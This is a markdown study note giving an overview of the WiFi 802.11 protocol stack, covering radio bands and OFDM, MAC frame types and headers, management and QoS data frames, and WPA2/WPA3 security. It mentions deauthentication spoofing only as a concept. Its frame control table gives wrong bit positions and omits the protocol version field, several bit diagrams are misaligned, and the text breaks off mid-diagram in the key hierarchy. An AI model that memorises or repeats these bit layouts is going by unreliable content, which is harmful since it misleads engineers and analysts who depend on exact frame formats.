---
title: WiFi (802.11) Protocol Overview - Complete Stack Breakdown
tags: [WiFi, 802.11, protocol-analysis, PHY, MAC, OFDM, WPA2, WPA3, security]
category: WiFi Security
parent: "[[WiFi/README]]"
status: complete
---

# WiFi (802.11) Protocol Overview - Complete Stack Breakdown

> **Purpose**: Comprehensive technical breakdown of all WiFi protocol layers from Physical (PHY) to Application, including frame structures, authentication flows, encryption mechanisms, and attack surfaces.


# **WiFi (802.11) - COMPLETE PROTOCOL BREAKDOWN**

## **1. WiFi Architecture Overview**

WiFi operates in an **infrastructure** mode (most common) or **ad-hoc** mode:

```
┌─────────────────────────────────────────┐
│         APPLICATION LAYER               │
│  (HTTP, MQTT, DNS, etc.)                │
├─────────────────────────────────────────┤
│         TRANSPORT LAYER                 │
│  (TCP, UDP)                             │
├─────────────────────────────────────────┤
│         NETWORK LAYER                   │
│  (IP, ARP, ICMP)                        │
├─────────────────────────────────────────┤
│     ╔═══════════════════════════════╗   │
│     ║    IEEE 802.11 (WiFi)         ║   │
│     ╠═══════════════════════════════╣   │
│     ║  MAC (Medium Access Control)  ║   │ ← Frame types, CSMA/CA
│     ╠═══════════════════════════════╣   │
│     ║  PHY (Physical Layer)         ║   │ ← OFDM, Channels, Modulation
│     ╚═══════════════════════════════╝   │
└─────────────────────────────────────────┘
```

**Infrastructure Mode (Most Common):**
```
        ┌──────────────┐
        │ Access Point │ ← Coordinator
        │     (AP)     │
        └──────┬───────┘
               │
    ┌──────────┼──────────┬──────────┐
    ▼          ▼          ▼          ▼
┌────────┐ ┌────────┐ ┌────────┐ ┌────────┐
│Station │ │Station │ │Station │ │Station │
│  (STA) │ │  (STA) │ │  (STA) │ │  (STA) │
└────────┘ └────────┘ └────────┘ └────────┘
   Client     Client     Client     Client

All traffic goes through the AP (star topology)
```

**Ad-Hoc Mode (IBSS - Independent Basic Service Set):**
```
┌────────┐     ┌────────┐
│Station │ ←→  │Station │
└───┬────┘     └───┬────┘
    │              │
    └──────┬───────┘
           ▼
       ┌────────┐
       │Station │
       └────────┘

Peer-to-peer, no AP (mesh-like)
```

---

## **2. PHYSICAL LAYER**

### **2.1 Frequency Bands & Channels**

WiFi operates in **two main bands** (2.4 GHz and 5 GHz):

```
┌────────────────────────────────────────────────────────┐
│              2.4 GHz BAND (802.11b/g/n)                │
├────────────────────────────────────────────────────────┤
│  Frequency Range: 2.400 - 2.4835 GHz                   │
│  Channel Count: 14 channels (varies by region)         │
│  Channel Width: 20 MHz (standard) or 40 MHz (802.11n)  │
│  Channel Spacing: 5 MHz                                │
│                                                        │
│  Channel Layout:                                       │
│  ┌────────────────────────────────────────────────┐    │
│  │ CH1  CH2  CH3  CH4  CH5  CH6  CH7  CH8  ...   │    │
│  │ 2412 2417 2422 2427 2432 2437 2442 2447 MHz   │    │
│  └────────────────────────────────────────────────┘    │
│                                                        │
│  Non-Overlapping Channels (20 MHz):                    │
│  ├── Channel 1 (2412 MHz)                              │
│  ├── Channel 6 (2437 MHz)  ← Most common setup        │
│  └── Channel 11 (2462 MHz)                             │
│                                                        │
│  Regional Differences:                                 │
│  • USA/Canada: Channels 1-11                           │
│  • Europe: Channels 1-13                               │
│  • Japan: Channels 1-14 (Ch 14 only 802.11b)           │
└────────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────────┐
│              5 GHz BAND (802.11a/n/ac/ax)              │
├────────────────────────────────────────────────────────┤
│  Frequency Range: 5.150 - 5.850 GHz                    │
│  Channel Count: 24+ non-overlapping channels           │
│  Channel Width: 20, 40, 80, 160 MHz                    │
│                                                        │
│  UNII Bands:                                           │
│  ├── UNII-1: 5.150-5.250 GHz (Ch 36, 40, 44, 48)      │
│  ├── UNII-2: 5.250-5.350 GHz (Ch 52, 56, 60, 64)      │
│  ├── UNII-2e: 5.470-5.725 GHz (Ch 100-144)            │
│  └── UNII-3: 5.725-5.850 GHz (Ch 149-165)             │
│                                                        │
│  Advantages:                                           │
│  ✓ More non-overlapping channels                       │
│  ✓ Less interference (no Bluetooth/Zigbee/microwaves) │
│  ✓ Higher throughput potential                         │
│  ✗ Shorter range (higher frequency)                    │
│  ✗ Less wall penetration                               │
└────────────────────────────────────────────────────────┘
```

**Channel Overlap Problem (2.4 GHz):**
```
2.4 GHz Spectrum:
├─────────────────────────────────────────────────────┐
│ 2400                                         2483.5 │ MHz
└─────────────────────────────────────────────────────┘

Channel 1 (2412 MHz):
    [═══════════════════]
      -10      0      +10 MHz

Channel 6 (2437 MHz):
                      [═══════════════════]
                        -10      0      +10 MHz

Channel 11 (2462 MHz):
                                        [═══════════════════]
                                          -10      0      +10 MHz

✓ NO OVERLAP between 1, 6, and 11!

But Channel 2 overlaps with 1, 3, 4, 5, 6...
```

### **2.2 WiFi Standards Evolution**

```
┌─────────────┬──────────┬────────────┬───────────────┬──────────────┐
│  Standard   │   Year   │  Band      │  Max Data     │ Modulation   │
│             │          │            │  Rate         │              │
├─────────────┼──────────┼────────────┼───────────────┼──────────────┤
│ 802.11      │   1997   │  2.4 GHz   │    2 Mbps     │ DSSS/FHSS    │
│ 802.11b     │   1999   │  2.4 GHz   │   11 Mbps     │ DSSS         │
│ 802.11a     │   1999   │  5 GHz     │   54 Mbps     │ OFDM         │
│ 802.11g     │   2003   │  2.4 GHz   │   54 Mbps     │ OFDM         │
│ 802.11n     │   2009   │  2.4/5 GHz │  600 Mbps     │ OFDM + MIMO  │
│  (WiFi 4)   │          │            │               │              │
│ 802.11ac    │   2013   │  5 GHz     │ 6.9 Gbps      │ OFDM + MIMO  │
│  (WiFi 5)   │          │            │               │              │
│ 802.11ax    │   2019   │  2.4/5 GHz │ 9.6 Gbps      │ OFDMA + MIMO │
│  (WiFi 6)   │          │            │               │              │
│ 802.11be    │   2024   │  2.4/5/6   │ 46 Gbps       │ OFDMA + MIMO │
│  (WiFi 7)   │          │  GHz       │               │              │
└─────────────┴──────────┴────────────┴───────────────┴──────────────┘
```

### **2.3 OFDM Modulation (802.11a/g/n/ac/ax)**

**Orthogonal Frequency-Division Multiplexing** - the modern WiFi modulation:

```
TRADITIONAL SINGLE CARRIER:
Frequency ▲
          │    ═══════════════════════════
          │    (Single wide channel)
          └─────────────────────────────────► Time

OFDM MULTI-CARRIER:
Frequency ▲
          │  │ │ │ │ │ │ │ │ │ │ │ │ │ │
          │  │ │ │ │ │ │ │ │ │ │ │ │ │ │  (52-64 subcarriers)
          │  │ │ │ │ │ │ │ │ │ │ │ │ │ │
          └─────────────────────────────────► Time
             Each vertical line = subcarrier
             Orthogonal = don't interfere
```

**OFDM Parameters (20 MHz channel):**
```
┌────────────────────────────────────────┐
│ Subcarriers: 52 (64 total)             │
│ ├── Data: 48 subcarriers               │
│ └── Pilot: 4 subcarriers (sync)        │
│                                        │
│ Subcarrier Spacing: 312.5 kHz          │
│ Symbol Duration: 4 μs                  │
│ Guard Interval: 0.8 μs                 │
│ Total Symbol Time: 4.8 μs              │
└────────────────────────────────────────┘

Each subcarrier modulated with:
- BPSK  (1 bit/symbol)
- QPSK  (2 bits/symbol)
- 16-QAM (4 bits/symbol)
- 64-QAM (6 bits/symbol)
- 256-QAM (8 bits/symbol) [802.11ac+]
- 1024-QAM (10 bits/symbol) [802.11ax]
```

### **2.4 Data Rates (802.11g/n Example)**

```
┌────────────┬─────────────┬─────────────────┬──────────────┐
│ Modulation │ Coding Rate │ 20 MHz Channel  │ 40 MHz Chan. │
│            │             │ (802.11g/n)     │ (802.11n)    │
├────────────┼─────────────┼─────────────────┼──────────────┤
│ BPSK       │ 1/2         │   6 Mbps        │  13.5 Mbps   │
│ QPSK       │ 1/2         │  12 Mbps        │  27 Mbps     │
│ QPSK       │ 3/4         │  18 Mbps        │  40.5 Mbps   │
│ 16-QAM     │ 1/2         │  24 Mbps        │  54 Mbps     │
│ 16-QAM     │ 3/4         │  36 Mbps        │  81 Mbps     │
│ 64-QAM     │ 2/3         │  48 Mbps        │  108 Mbps    │
│ 64-QAM     │ 3/4         │  54 Mbps        │  121.5 Mbps  │
│ 64-QAM     │ 5/6         │  58.5 Mbps      │  135 Mbps    │
└────────────┴─────────────┴─────────────────┴──────────────┘

With MIMO (Multiple streams):
2x2 MIMO: 2× data rate (e.g., 54 → 108 Mbps)
4x4 MIMO: 4× data rate (e.g., 54 → 216 Mbps)
```

---

## **3. MAC LAYER - FRAME TYPES**

### **3.1 Frame Type Overview**

802.11 defines **THREE main frame types**:

```
┌────────────────────────────────────────────────────┐
│                MANAGEMENT FRAMES                   │
│  (Network management, association, etc.)           │
│  ├── Beacon                                        │
│  ├── Probe Request / Probe Response                │
│  ├── Authentication                                │
│  ├── Association Request / Response                │
│  ├── Reassociation Request / Response              │
│  ├── Deauthentication                              │
│  ├── Disassociation                                │
│  └── Action (various subtypes)                     │
└────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────┐
│                  CONTROL FRAMES                    │
│  (Medium access, ACKs, flow control)               │
│  ├── RTS (Request To Send)                         │
│  ├── CTS (Clear To Send)                           │
│  ├── ACK (Acknowledgment)                          │
│  ├── PS-Poll (Power Save Poll)                     │
│  └── Block ACK                                     │
└────────────────────────────────────────────────────┘

┌────────────────────────────────────────────────────┐
│                   DATA FRAMES                      │
│  (Actual user data transmission)                   │
│  ├── Data                                          │
│  ├── Null Data (no payload)                        │
│  ├── QoS Data (Quality of Service)                 │
│  └── QoS Null                                      │
└────────────────────────────────────────────────────┘
```

---

## **4. FRAME STRUCTURE (GENERIC 802.11 FRAME)**

Every WiFi frame has this basic structure:

```
┌─────────────┬──────────────┬────────────────┬──────┐
│ MAC HEADER  │  FRAME BODY  │  FCS (CRC-32)  │ ...  │
│ (24-30 B)   │  (0-2312 B)  │  (4 bytes)     │      │
└─────────────┴──────────────┴────────────────┴──────┘
```

### **4.1 MAC Header Structure**

```
┌───────────────────────────────────────────────────────┐
│                   MAC HEADER                          │
│  (24 bytes minimum, 30 bytes with optional fields)    │
├───────────────────────────────────────────────────────┤
│  Frame Control (2 bytes)                              │
│  Duration/ID (2 bytes)                                │
│  Address 1 (6 bytes) - Usually Destination            │
│  Address 2 (6 bytes) - Usually Source                 │
│  Address 3 (6 bytes) - Usually BSSID                  │
│  Sequence Control (2 bytes)                           │
│  [Address 4 (6 bytes)] - Optional (WDS)               │
│  [QoS Control (2 bytes)] - Optional (QoS frames)      │
│  [HT Control (4 bytes)] - Optional (802.11n+)         │
└───────────────────────────────────────────────────────┘
```

### **4.2 Frame Control Field (2 bytes / 16 bits)**

```
Bit Layout:
┌────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┐
│ 15 │ 14 │ 13 │ 12 │ 11 │ 10 │  9 │  8 │  7 │  6 │  5 │  4 │  3 │  2 │  1 │  0 │
├────┴────┼────┼────┼────┼────┼────┼────┼────┼────┼────┼────┴────┴────┴────┴────┤
│ Order   │Prot│More│ PM │More│Retry│PwrM│To  │From│Frag│Reserved│  Subtype  │Type│
│         │ect │Data│    │Frag│     │gt  │ DS │ DS │    │        │  (4 bit)  │(2b)│
└─────────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────────┴───────────┴────┘
```

**Field Breakdown:**

| Field | Bits | Values | Meaning |
|-------|------|--------|---------|
| **Type** | 0-1 | 00=Management, 01=Control, 10=Data, 11=Reserved | Frame type |
| **Subtype** | 2-5 | Varies by type | Specific frame subtype |
| **To DS** | 6 | 0=Not to AP, 1=To AP | Frame going to Distribution System |
| **From DS** | 7 | 0=Not from AP, 1=From AP | Frame from Distribution System |
| **More Frag** | 8 | 0=Last/Only, 1=More fragments | Fragmentation status |
| **Retry** | 9 | 0=Original, 1=Retransmission | Retransmission flag |
| **Power Mgmt** | 10 | 0=Active, 1=Power Save | Station power state |
| **More Data** | 11 | 0=No more, 1=More buffered | More data buffered for STA |
| **Protected** | 12 | 0=Unencrypted, 1=Encrypted | Frame is encrypted (WEP/WPA) |
| **Order** | 13 | 0=Not ordered, 1=Strictly ordered | Strictly ordered flag |

**Type and Subtype Combinations:**

```
TYPE 00 (MANAGEMENT FRAMES):
┌─────────┬─────────────────────────┐
│Subtype  │ Frame                   │
├─────────┼─────────────────────────┤
│ 0000    │ Association Request     │
│ 0001    │ Association Response    │
│ 0010    │ Reassociation Request   │
│ 0011    │ Reassociation Response  │
│ 0100    │ Probe Request           │
│ 0101    │ Probe Response          │
│ 1000    │ Beacon                  │
│ 1001    │ ATIM                    │
│ 1010    │ Disassociation          │
│ 1011    │ Authentication          │
│ 1100    │ Deauthentication        │
│ 1101    │ Action                  │
└─────────┴─────────────────────────┘

TYPE 01 (CONTROL FRAMES):
┌─────────┬─────────────────────────┐
│Subtype  │ Frame                   │
├─────────┼─────────────────────────┤
│ 1010    │ PS-Poll                 │
│ 1011    │ RTS                     │
│ 1100    │ CTS                     │
│ 1101    │ ACK                     │
│ 1110    │ CF-End                  │
└─────────┴─────────────────────────┘

TYPE 10 (DATA FRAMES):
┌─────────┬─────────────────────────┐
│Subtype  │ Frame                   │
├─────────┼─────────────────────────┤
│ 0000    │ Data                    │
│ 0100    │ Null (no data)          │
│ 1000    │ QoS Data                │
│ 1100    │ QoS Null                │
└─────────┴─────────────────────────┘
```

### **4.3 Address Fields**

WiFi uses **4 address fields** (though usually only 3 are used):

```
Address Field Usage (To DS / From DS):

┌──────────┬─────────┬──────────┬──────────┬──────────┐
│ To DS    │ From DS │ Addr 1   │ Addr 2   │ Addr 3   │
├──────────┼─────────┼──────────┼──────────┼──────────┤
│    0     │    0    │ DA       │ SA       │ BSSID    │ (Ad-hoc)
│    0     │    1    │ DA       │ BSSID    │ SA       │ (From AP)
│    1     │    0    │ BSSID    │ SA       │ DA       │ (To AP)
│    1     │    1    │ RA       │ TA       │ DA       │ (WDS - 4 addrs)
└──────────┴─────────┴──────────┴──────────┴──────────┘

DA = Destination Address
SA = Source Address
BSSID = Basic Service Set ID (AP's MAC)
RA = Receiver Address
TA = Transmitter Address
```

**Example Frame Addresses:**

```
SCENARIO: Client (STA) sending to Internet via AP

Client MAC: AA:BB:CC:DD:EE:11
AP MAC:     AA:BB:CC:DD:EE:FF (BSSID)
Gateway:    AA:BB:CC:DD:EE:22

Frame from Client to AP:
├── To DS: 1, From DS: 0
├── Address 1: AA:BB:CC:DD:EE:FF (BSSID - receiver)
├── Address 2: AA:BB:CC:DD:EE:11 (SA - sender)
└── Address 3: AA:BB:CC:DD:EE:22 (DA - final destination)

Frame from AP to Client:
├── To DS: 0, From DS: 1
├── Address 1: AA:BB:CC:DD:EE:11 (DA - receiver)
├── Address 2: AA:BB:CC:DD:EE:FF (BSSID - sender)
└── Address 3: AA:BB:CC:DD:EE:22 (SA - original source)
```

### **4.4 Sequence Control (2 bytes)**

```
┌─────────────────────────────────┬──────────────┐
│   Sequence Number (12 bits)     │Fragment (4b) │
│   0-4095 (wraps around)         │   0-15       │
└─────────────────────────────────┴──────────────┘

Purpose:
- Detect duplicate frames (retransmissions)
- Reorder fragmented frames
- Each MSDU gets new sequence number
```

---

## **5. MANAGEMENT FRAMES - DEEP DIVE**

### **5.1 Beacon Frame**

**Purpose**: AP broadcasts its presence and capabilities

```
BEACON FRAME STRUCTURE:

┌─────────────────────────────────────────────────────┐
│              MAC HEADER (24 bytes)                  │
│  Frame Control: Type=00, Subtype=1000 (Beacon)      │
│  Duration: 0                                        │
│  Address 1: FF:FF:FF:FF:FF:FF (Broadcast)           │
│  Address 2: AA:BB:CC:DD:EE:FF (AP MAC/BSSID)        │
│  Address 3: AA:BB:CC:DD:EE:FF (BSSID)               │
│  Sequence Control: (increments)                     │
├─────────────────────────────────────────────────────┤
│           FRAME BODY (BEACON PAYLOAD)               │
│  ┌───────────────────────────────────────────────┐  │
│  │ Timestamp (8 bytes)                           │  │
│  │ Beacon Interval (2 bytes) - usually 100 TU   │  │
│  │   (TU = Time Unit = 1024 μs = ~1.024 ms)     │  │
│  │ Capability Info (2 bytes)                     │  │
│  ├───────────────────────────────────────────────┤  │
│  │          TAGGED PARAMETERS                    │  │
│  │  (Type-Length-Value format)                   │  │
│  │                                               │  │
│  │  ├─ SSID (Tag 0)                              │  │
│  │  │  Length: Variable (0-32 bytes)            │  │
│  │  │  Value: Network name "MyNetwork"          │  │
│  │  │                                            │  │
│  │  ├─ Supported Rates (Tag 1)                   │  │
│  │  │  Length: Variable                         │  │
│  │  │  Value: 6, 9, 12, 18, 24, 36, 48, 54 Mbps│  │
│  │  │                                            │  │
│  │  ├─ DS Parameter Set (Tag 3)                  │  │
│  │  │  Length: 1 byte                           │  │
│  │  │  Value: Channel number (e.g., 6)          │  │
│  │  │                                            │  │
│  │  ├─ TIM (Traffic Indication Map) (Tag 5)     │  │
│  │  │  Length: Variable                         │  │
│  │  │  Value: Buffered frames for sleeping STAs │  │
│  │  │                                            │  │
│  │  ├─ Country (Tag 7)                           │  │
│  │  │  Value: Country code + channel info       │  │
│  │  │                                            │  │
│  │  ├─ RSN (Robust Security Network) (Tag 48)   │  │
│  │  │  Length: Variable                         │  │
│  │  │  Value: WPA2/WPA3 security info           │  │
│  │  │    ├─ Group Cipher Suite                  │  │
│  │  │    ├─ Pairwise Cipher Suites              │  │
│  │  │    ├─ AKM (Auth Key Management) Suites    │  │
│  │  │    └─ RSN Capabilities                    │  │
│  │  │                                            │  │
│  │  ├─ HT Capabilities (Tag 45) - 802.11n       │  │
│  │  ├─ VHT Capabilities (Tag 191) - 802.11ac    │  │
│  │  └─ HE Capabilities (Tag 255) - 802.11ax     │  │
│  └───────────────────────────────────────────────┘  │
├─────────────────────────────────────────────────────┤
│                  FCS (4 bytes)                      │
└─────────────────────────────────────────────────────┘

Beacon Interval: Typically 100 TU = 102.4 ms
Rate: ~10 beacons per second
```

**Capability Information Field (2 bytes):**
```
Bits:
┌────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┐
│ 15 │ 14 │ 13 │ 12 │ 11 │ 10 │  9 │  8 │  7 │  6 │  5 │  4 │  3 │  2 │  1 │  0 │
├────┴────┴────┴────┴────┴────┴────┴────┼────┼────┼────┼────┼────┼────┼────┼────┤
│           Reserved                    │Spec│APSD│QoS │ShPr│DSSS│Priv│CF-P│CF-P│ESS│IBSS│
│                                       │Mgmt│    │    │Slot│OFDM│acy │Poll│Rsp │    │    │
└───────────────────────────────────────┴────┴────┴────┴────┴────┴────┴────┴────┴────┴────┘

Key Flags:
- ESS (bit 0): 1 = Infrastructure mode (AP)
- IBSS (bit 1): 1 = Ad-hoc mode
- Privacy (bit 4): 1 = WEP/WPA/WPA2/WPA3 enabled
```

### **5.2 Probe Request / Probe Response**

**Active Scanning** - Client searches for networks:

```
PROBE REQUEST (from Client):
┌─────────────────────────────────────────────────────┐
│              MAC HEADER                             │
│  Frame Control: Type=00, Subtype=0100              │
│  Address 1: FF:FF:FF:FF:FF:FF (Broadcast)           │
│  Address 2: Client MAC                              │
│  Address 3: FF:FF:FF:FF:FF:FF (Broadcast BSSID)     │
├─────────────────────────────────────────────────────┤
│           FRAME BODY                                │
│  ├─ SSID: "" (broadcast) or "MyNetwork" (directed) │
│  ├─ Supported Rates                                 │
│  └─ Extended Capabilities                           │
└─────────────────────────────────────────────────────┘

PROBE RESPONSE (from AP):
┌─────────────────────────────────────────────────────┐
│              MAC HEADER                             │
│  Frame Control: Type=00, Subtype=0101              │
│  Address 1: Client MAC (unicast!)                   │
│  Address 2: AP MAC (BSSID)                          │
│  Address 3: AP MAC (BSSID)                          │
├─────────────────────────────────────────────────────┤
│           FRAME BODY                                │
│  (Same as Beacon: Timestamp, Capabilities, Tags)    │
└─────────────────────────────────────────────────────┘

Difference from Beacon:
- Probe Response is unicast (to specific client)
- Sent on-demand (not periodic)
- Usually same content as beacon
```

### **5.3 Authentication Frame**

**Open System Authentication** (no real security, just identity):

```
AUTHENTICATION REQUEST (from Client):
┌─────────────────────────────────────────────────────┐
│              MAC HEADER                             │
│  Frame Control: Type=00, Subtype=1011              │
│  Address 1: AP MAC (BSSID)                          │
│  Address 2: Client MAC                              │
│  Address 3: AP MAC (BSSID)                          │
├─────────────────────────────────────────────────────┤
│           FRAME BODY                                │
│  ├─ Authentication Algorithm: 0x0000 (Open System) │
│  ├─ Authentication Transaction Sequence: 0x0001     │
│  └─ Status Code: 0x0000 (Reserved)                  │
└─────────────────────────────────────────────────────┘

AUTHENTICATION RESPONSE (from AP):
┌─────────────────────────────────────────────────────┐
│              MAC HEADER                             │
│  Address 1: Client MAC                              │
│  Address 2: AP MAC (BSSID)                          │
│  Address 3: AP MAC (BSSID)                          │
├─────────────────────────────────────────────────────┤
│           FRAME BODY                                │
│  ├─ Authentication Algorithm: 0x0000               │
│  ├─ Authentication Transaction Sequence: 0x0002     │
│  └─ Status Code: 0x0000 (Success) or error         │
└─────────────────────────────────────────────────────┘
```

**Status Codes:**
```
┌──────────┬─────────────────────────────────┐
│  Code    │ Meaning                         │
├──────────┼─────────────────────────────────┤
│ 0x0000   │ Success                         │
│ 0x0001   │ Unspecified failure             │
│ 0x000A   │ Cannot support capabilities     │
│ 0x000D   │ Invalid authentication          │
│ 0x0011   │ Authentication rejected (temp)  │
│ 0x0012   │ Challenge text mismatch         │
└──────────┴─────────────────────────────────┘
```

### **5.4 Association Request / Response**

**After authentication, client associates:**

```
ASSOCIATION REQUEST (from Client):
┌─────────────────────────────────────────────────────┐
│              MAC HEADER                             │
│  Frame Control: Type=00, Subtype=0000              │
│  Address 1: AP MAC (BSSID)                          │
│  Address 2: Client MAC                              │
│  Address 3: AP MAC (BSSID)                          │
├─────────────────────────────────────────────────────┤
│           FRAME BODY                                │
│  ├─ Capability Info (2 bytes)                       │
│  ├─ Listen Interval (2 bytes)                       │
│  │   └─ How often client wakes to listen            │
│  │                                                   │
│  └─ Tagged Parameters:                              │
│     ├─ SSID                                         │
│     ├─ Supported Rates                              │
│     ├─ Extended Supported Rates                     │
│     ├─ RSN (WPA2/WPA3 info)                         │
│     └─ HT/VHT Capabilities                          │
└─────────────────────────────────────────────────────┘

ASSOCIATION RESPONSE (from AP):
┌─────────────────────────────────────────────────────┐
│              MAC HEADER                             │
│  Address 1: Client MAC                              │
│  Address 2: AP MAC (BSSID)                          │
│  Address 3: AP MAC (BSSID)                          │
├─────────────────────────────────────────────────────┤
│           FRAME BODY                                │
│  ├─ Capability Info (2 bytes)                       │
│  ├─ Status Code (2 bytes)                           │
│  │   └─ 0x0000 = Success                            │
│  ├─ Association ID (AID) (2 bytes)                  │
│  │   └─ 1-2007 (unique identifier for client)       │
│  │                                                   │
│  └─ Tagged Parameters:                              │
│     ├─ Supported Rates                              │
│     ├─ Extended Supported Rates                     │
│     └─ HT/VHT Operation                             │
└─────────────────────────────────────────────────────┘
```

### **5.5 Deauthentication Frame**

**Forcibly disconnect a client:**

```
DEAUTHENTICATION (from AP or Client):
┌─────────────────────────────────────────────────────┐
│              MAC HEADER                             │
│  Frame Control: Type=00, Subtype=1100              │
│  Address 1: Destination (Client or AP)              │
│  Address 2: Source (AP or Client)                   │
│  Address 3: BSSID                                   │
├─────────────────────────────────────────────────────┤
│           FRAME BODY                                │
│  └─ Reason Code (2 bytes)                           │
└─────────────────────────────────────────────────────┘

Common Reason Codes:
┌──────────┬────────────────────────────────────┐
│  Code    │ Meaning                            │
├──────────┼────────────────────────────────────┤
│ 0x0001   │ Unspecified reason                 │
│ 0x0002   │ Previous auth no longer valid      │
│ 0x0003   │ Deauth because leaving BSS         │
│ 0x0004   │ Inactivity                         │
│ 0x0005   │ AP unable to handle all STAs       │
│ 0x0006   │ Class 2 frame from non-auth STA    │
│ 0x0007   │ Class 3 frame from non-assoc STA   │
│ 0x0008   │ Disassociated because leaving BSS  │
└──────────┴────────────────────────────────────┘

⚠️ ATTACK VECTOR: Deauth frames are NOT encrypted
   → Can be spoofed to disconnect clients!
```

### **5.6 Disassociation Frame**

**Break association but keep authentication:**

```
DISASSOCIATION (from AP or Client):
┌─────────────────────────────────────────────────────┐
│              MAC HEADER                             │
│  Frame Control: Type=00, Subtype=1010              │
│  Address 1: Destination                             │
│  Address 2: Source                                  │
│  Address 3: BSSID                                   │
├─────────────────────────────────────────────────────┤
│           FRAME BODY                                │
│  └─ Reason Code (2 bytes)                           │
└─────────────────────────────────────────────────────┘

Difference from Deauth:
- Disassoc: Breaks association, keeps auth state
- Deauth: Breaks both association AND auth state
- Both can be used for attacks
```

---

## **6. DATA FRAMES**

### **6.1 QoS Data Frame**

Most modern WiFi uses **QoS (Quality of Service)** data frames:

```
QoS DATA FRAME STRUCTURE:
┌─────────────────────────────────────────────────────┐
│              MAC HEADER (26 bytes)                  │
│  Frame Control: Type=10, Subtype=1000 (QoS Data)   │
│  Duration/ID                                        │
│  Address 1: Receiver Address                        │
│  Address 2: Transmitter Address                     │
│  Address 3: (depends on To DS/From DS)              │
│  Sequence Control                                   │
│  QoS Control (2 bytes) ← ADDED FOR QoS             │
├─────────────────────────────────────────────────────┤
│           DATA (LLC + SNAP + IP + ...)              │
│  ┌───────────────────────────────────────────────┐  │
│  │ LLC Header (3 bytes)                          │  │
│  │ SNAP Header (5 bytes)                         │  │
│  │ IP Packet                                     │  │
│  │   ├─ IP Header                                │  │
│  │   ├─ TCP/UDP Header                           │  │
│  │   └─ Application Data                         │  │
│  └───────────────────────────────────────────────┘  │
├─────────────────────────────────────────────────────┤
│                  FCS (4 bytes)                      │
└─────────────────────────────────────────────────────┘
```

**QoS Control Field (2 bytes):**
```
┌────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┬────┐
│ 15 │ 14 │ 13 │ 12 │ 11 │ 10 │  9 │  8 │  7 │  6 │  5 │  4 │  3 │  2 │  1 │  0 │
├────┴────┴────┴────┴────┴────┴────┴────┼────┴────┴────┴────┴────┴────┴────┴────┤
│           TXOP / AP PS Buffer           │          TID (Traffic ID)           │
│              State / Queue              │         (0-7: Priority)             │
└─────────────────────────────────────────┴─────────────────────────────────────┘

TID (Traffic Identifier):
┌─────┬──────────────────────────────┐
│ TID │ Access Category / Priority   │
├─────┼──────────────────────────────┤
│ 0-1 │ Background (BK)              │
│ 2-3 │ Best Effort (BE)             │
│ 4-5 │ Video (VI)                   │
│ 6-7 │ Voice (VO) - highest priority│
└─────┴──────────────────────────────┘
```

---

## **7. SECURITY MECHANISMS**

### **7.1 Security Evolution**

```
┌─────────────────────────────────────────────────────┐
│                    WEP (BROKEN!)                    │
│  • Wired Equivalent Privacy                         │
│  • RC4 stream cipher (40-bit or 104-bit key)        │
│  • 24-bit IV (Initialization Vector)                │
│  • BROKEN in 2001 (IV reuse, weak keys)             │
│  • Can be cracked in minutes                        │
│  • DO NOT USE!                                      │
└─────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────┐
│              WPA (Transitional)                     │
│  • WiFi Protected Access                            │
│  • TKIP (Temporal Key Integrity Protocol)           │
│  • Per-packet key mixing                            │
│  • Still uses RC4 (compatibility with WEP hardware) │
│  • Better than WEP, but deprecated                  │
└─────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────┐
│              WPA2 (Current Standard)                │
│  • 802.11i standard                                 │
│  • AES-CCMP (Counter Mode with CBC-MAC)             │
│  • Strong encryption                                │
│  • Vulnerable to KRACK attack (patched)             │
│  • Still widely used                                │
└─────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────┐
│              WPA3 (Latest)                          │
│  • Introduced 2018                                  │
│  • SAE (Simultaneous Authentication of Equals)      │
│  • Forward secrecy                                  │
│  • Protection against offline dictionary attacks    │
│  • 192-bit security suite (WPA3-Enterprise)         │
│  • Still being deployed                             │
└─────────────────────────────────────────────────────┘
```

### **7.2 WPA2-PSK (Pre-Shared Key) - 4-Way Handshake**

**The most common WiFi security setup:**

```
PHASE 1: ASSOCIATION (Unencrypted)
──────────────────────────────────────────────────────
Client                                    AP
  │                                       │
  │─── Probe Request ─────────────────────→│
  │←── Probe Response ────────────────────│
  │─── Authentication Request ────────────→│
  │←── Authentication Response ────────────│
  │─── Association Request ───────────────→│
  │    [Includes RSN IE with WPA2 info]    │
  │←── Association Response ───────────────│
  │                                       │

At this point:
- Association complete, but NO encryption yet
- Both sides know the PSK (from WiFi password)
- PSK = PBKDF2(password, SSID, 4096 iterations, 256 bits)

PHASE 2: 4-WAY HANDSHAKE (EAPOL Frames)
──────────────────────────────────────────────────────
Client                                    AP
  │                                       │
  │    Both know: PMK (from PSK)          │
  │    Generate: ANonce (AP), SNonce (STA)│
  │                                       │
  │←── Message 1 ──────────────────────────│
  │    [ANonce, no MIC]                    │
  │    AP sends its nonce                  │
  │                                       │
  │    Client computes PTK:               │
  │    PTK = PRF(PMK, ANonce, SNonce,     │
  │              AP_MAC, STA_MAC)          │
  │                                       │
  │─── Message 2 ──────────────────────────→│
  │    [SNonce, MIC, RSN IE]               │
  │    Client proves knowledge of PSK      │
  │                                       │
  │    AP computes PTK (same formula)      │
  │    AP verifies MIC                     │
  │                                       │
  │←── Message 3 ──────────────────────────│
  │    [ANonce, MIC, GTK encrypted]        │
  │    AP sends Group Temporal Key         │
  │                                       │
  │─── Message 4 ──────────────────────────→│
  │    [MIC, ACK]                          │
  │    Client confirms GTK received        │
  │                                       │
  │  [ENCRYPTED COMMUNICATION BEGINS]      │
  │                                       │
```

**Key Hierarchy:**

```
┌─────────────────────────────────────────┐
│  PSK (Pre-Shared Key) - 256 bits       │
│  = PBKDF2(password, SSID, 4096, 256)   │
│  Also called PMK (Pairwise Master Key) │
└────────────────┬────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────┐
│  PTK (Pairwise Transient Key) - 512 b  │
│  = PRF-512(PMK, "Pairwise key          │
│             expansion", min(AP_MAC,     │
│             STA_MAC) | max(AP_MAC,      │
│             STA_MAC) | min(ANonce,      │
